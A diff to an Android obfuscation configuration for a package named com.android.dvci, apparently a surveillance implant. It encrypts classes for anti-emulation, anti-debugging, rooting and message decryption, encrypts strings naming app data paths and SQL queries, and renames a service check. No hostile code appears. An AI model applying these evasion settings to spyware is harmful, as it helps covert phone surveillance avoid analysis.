@@ -2,7 +2,8 @@
 #-verbose
 -encryptclasses com.android.dvci.util.AntiEmulator,com.android.dvci.MessagesDecrypt,
 		com.android.dvci.Root,com.android.dvci.Core,
-		com.android.dvci.util.AntiDebug,com.android.dvci.util.AntiEmulator
+		com.android.dvci.util.AntiDebug,com.android.dvci.util.AntiEmulator,
+		com.android.dvci.module.message.MsgHandler
 
 -encryptstrings "http://*","https://*","/data/data/*","/auth/user_data/*","l*",".lost.found"
 -encryptstrings "AES*","*SELECT*","select*","gt-*","*.google.com","getApplicationInfo"
@@ -16,7 +17,7 @@
 }
 
 -accessthroughreflection class android.content.pm.PackageManager {
-    String getInstallerPackageName(String);
+    java.lang.String getInstallerPackageName(java.lang.String);
 }
 
 -encryptstrings "android.content.pm.ApplicationInfo", "flags"
@@ -34,18 +35,18 @@
 # -optimizations !code/simplification/cast
 
 # l'ottimizzazione seguente fa crashare smali, disabilitare solo se occorre manipolare il codice
-#-optimizations !method/marking/final
+@MERGE@ -optimizations !method/marking/final
 -optimizations !method/inlining/*
 
 -classobfuscationdictionary "keywords.txt"
 -packageobfuscationdictionary "keywords.txt"
 -obfuscationdictionary "keywords.txt"
 -useuniqueclassmembernames
-#-applymapping "rcs_mapping.txt"
+@MAPPING@ -applymapping "rcs_mapping.txt"
 
-#togliere l'offuscamento di com.android.dvci.Core.isServiceRunning
+#togliere l'offuscamento di iSR
 -keepclassmembers class com.android.dvci.Core {
-    public static boolean isServiceRunning();
+    public static boolean iSR();
 }
 
 #-keepclassmembers class com.android.dvci.util.Instrument
@@ -61,7 +62,7 @@
 -keep public class com.android.dvci.BM
 -keep public class com.android.dvci.listener.AR
 -keep public class com.android.dvci.optimize.NetworkOptimizer
--keep public class com.android.dvci.gui.ASG
+@RELEASE@ -keep public class com.android.dvci.gui.ASG
 
 #-keep class com.musicg.** { *; }
 -keep class android.media.** {*;}
